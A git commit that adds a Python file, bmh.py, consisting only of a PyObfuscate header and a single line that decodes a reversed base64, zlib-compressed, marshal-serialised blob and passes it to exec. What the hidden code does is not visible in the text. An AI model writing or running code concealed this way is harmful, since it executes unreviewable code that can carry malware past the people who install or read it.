8069c73fe28116fcdc9180a3454baebe18bfe7e8
COOL-ROOM-368 <147789027+COOL-ROOM-368@users.noreply.github.com>
2024-01-18 09:23:03 +0630

    Add files via upload

---
+++ bmh.py
@@ -0,0 +1,5 @@
+# Obfuscated with PyObfuscate
+# https://www.github.com/htr-tech
+# Time : Thu Jan 18 09:19:51 2024
+# -------------------------------
+_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'=UVHXxDAAUlAxWRDAiLkg5tMyMDM+QyCswFQMKWgYrY7SNnSTNvcshzv2VhNM/V+g8shKtOSREmhuJ1SWk+kP980Rf9wXnc3LiXyrSiE8nMoMThwQiMyFjxyQOMmCDpwQ6MmQCxs6DFTCAkZLxJe'))
